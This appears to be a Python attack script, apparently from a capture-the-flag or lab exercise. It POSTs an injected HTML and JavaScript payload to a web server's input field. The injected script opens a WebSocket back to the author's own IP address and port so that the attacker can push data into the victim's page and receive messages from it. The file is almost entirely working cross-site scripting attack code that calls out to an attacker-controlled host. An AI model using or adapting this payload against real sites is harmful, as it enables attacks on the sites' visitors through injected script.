#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri Sep 17 17:49:37 2021

@author: crr0tz
"""

import requests

url = 'http://172.18.10.105:35697/'
my_ip = '172.20.251.72'
my_port = 4444

InputData  = ''
InputData += '<img class="myImg" src="notfound.png">'
InputData += '<script>'
InputData += f'websocket = new WebSocket("ws://{my_ip}:{my_port}/");'
InputData += 'websocket.binaryType = "arraybuffer";'
InputData += 'websocket.onopen = function(e) {'
InputData += 'console.log("[open] Connection established");'
InputData += ' };'
InputData += 'websocket.onmessage = function(msg) {'
InputData += 'console.log("[open] Message recieved");'
InputData += 'var arrayBuffer = msg.data;'
InputData += 'var bytes = new Uint8Array(arrayBuffer);'
InputData += 'var bytestr = ab2str(bytes);'
InputData += 'var image = document.getElementsByClassName("myImg")[0];'
InputData += 'image.src = "data:image/png;base64," + bytestr;'
InputData += '};'
InputData += 'websocket.onclose = function(event) {'
InputData += 'if (event.wasClean) {'
InputData += 'console.log("[close] Connection closed cleanly");'
InputData += '} else {'
InputData += 'console.log("[close] Connection died");'
InputData += '}'
InputData += '};'
InputData += 'websocket.onerror = function(error) {'
InputData += 'console.log("[error] ${error.message}");'
InputData += '};'
InputData += '// public method for encoding an Uint8Array to base64'
InputData += 'function ab2str(buf) {'
InputData += 'return String.fromCharCode.apply(null, new Uint16Array(buf));'
InputData += '}'
InputData += '</script>'

InputData = """Some Data
<!-- Import JavaScript Libraries. -->
<script type="text/javascript" src="https://github.com/gimite/web-socket-js/blob/master/swfobject.js"></script>
<script type="text/javascript" src="https://github.com/gimite/web-socket-js/blob/master/web_socket.js"></script>

<script type="text/javascript">
  
  // Let the library know where WebSocketMain.swf is:
  WEB_SOCKET_SWF_LOCATION = "WebSocketMain.swf";
  
  // Write your code in the same way as for native WebSocket:
  var ws = new WebSocket("ws://172.20.251.72:8765/");
  ws.onopen = function() {
    ws.send("Hello");  // Sends a message.
  };
  ws.onmessage = function(e) {
    // Receives a message.
    alert(e.data);
  };
  ws.onclose = function() {
    alert("closed");
  };
  
</script>
"""
r = requests.post(url, {"InputData": InputData})
print(r.text)